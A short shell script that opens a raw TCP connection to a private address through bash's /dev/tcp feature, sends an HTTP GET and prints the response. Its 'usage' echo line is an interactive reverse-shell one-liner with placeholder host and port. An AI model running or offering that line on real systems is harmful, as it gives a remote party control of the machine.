#!/bin/sh
echo "usage: bash -i 5<>/dev/tcp/HOST/PORT 0<&5 1>&5 2>&5"
exec 5<>/dev/tcp/10.0.0.13/80
printf "GET / HTTP/1.0\r\n\r\n" >&5
cat <&5
